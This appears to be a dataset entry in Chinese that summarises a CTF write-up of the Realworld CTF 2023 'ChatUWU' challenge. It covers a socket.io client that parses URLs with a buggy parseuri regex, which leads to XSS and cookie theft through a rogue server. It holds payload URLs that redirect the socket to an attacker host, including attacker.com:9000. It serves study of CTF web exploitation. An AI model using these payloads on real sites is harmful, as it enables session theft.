---
title: Realworld CTF 2023 - ChatUWU 详解
contest: Realworld CTF 2023
year: 2023
difficulty: medium
vuln_type: xss
tags: [xss, socket.io, parseuri, regex-bug, dompurify, cors, rogue-server, location-search]
attack_chain:
  - socket.io 聊天室 + DOMPurify 0.24.0 (基本无洞) 过滤 from/text
  - 前端 io(`/${location.search}`) 用 location.search 直接拼 socket URL
  - 后端: io.to('DOMPurify').emit('msg', {from, text, isHtml:true}) 才 innerHTML
  - 关键: socket.io 内部用 parseuri (https://github.com/galkn/parseuri) 解析 uri
  - 漏洞: parseuri 正则 /^(?:(?![^:@]+:[^:@/]*@)(http|https|ws|wss)://)?(...)?(@)?/ 解析 host 错误
  - payload: http://47.254.28.30:58000/?room=DOMPurify&nickname=guest5279@85.244.211.240:9000
  - @ 后面被解析为 authority (host:port) 而非 username
  - 攻击: 部署恶意 socket.io 服务器 (cors: '*') + 监听 0.0.0.0:7890
  - 恶意服务器: io.to('DOMPurify').emit('msg', {from:'pankas', text:'', isHtml:true}) 触发 XSS
  - 实际 XSS 触发: 房间 DOMPurify + isHtml=true → innerHTML 渲染
  - 完整利用: xssbot 访问恶意 URL + 触发内联 img/iframe + 窃取 cookie
key_payload: http://target/?room=DOMPurify&nickname=guest5279@attacker.com:9000
one_liner: Realworld CTF 2023 ChatUWU：socket.io 聊天室 DOMPurify 0.24 房间渲染 + parseuri 正则 @host 解析错误 → 攻击者控制 socket 服务器发送 XSS payload。
lesson: socket.io + parseuri 正则 @authority 解析错误是 web 经典高阶利用；房间级 isHtml 标志是 XSS 触发点；location.search 直接拼 URL 是反序列化攻击入口。
quality: high
---
